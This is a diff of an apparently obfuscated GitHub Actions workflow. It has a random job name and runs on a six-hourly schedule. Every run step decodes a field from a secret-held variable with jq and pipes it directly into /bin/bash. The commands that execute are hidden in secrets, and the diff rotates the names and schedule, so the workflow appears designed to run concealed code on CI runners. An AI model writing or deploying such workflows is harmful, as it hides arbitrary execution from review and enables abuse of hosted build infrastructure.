@@ -1,24 +1,21 @@
 name: maogechui4645
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 3/6 * * *'
+    - cron: '40 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: maogechui4645
         env:
-          gv88302: ${{ secrets.gv88302 }}
+          zif2327: ${{ secrets.zif2327 }}
         run: |
-          echo $gv88302 | jq -r .pkrre73950 | /bin/bash
-          echo $pg46859 | jq -r .wo40 | /bin/bash
-          echo $ycl8385 | jq -r .msf514 | /bin/bash
-          echo $l3 | jq -r .ra5074 | /bin/bash
-          echo $ynaks42 | jq -r .abd5 | /bin/bash
-          echo $t6 | jq -r .pulsv851 | /bin/bash
+          echo $zif2327 | jq -r .xxckn3 | /bin/bash
+          echo $ctsq961 | jq -r .za3 | /bin/bash
+          echo $hn10599 | jq -r .lxcs261 | /bin/bash
+          echo $cryd69 | jq -r .yzf559 | /bin/bash
+          echo $bbnyw56 | jq -r .a74191 | /bin/bash
 
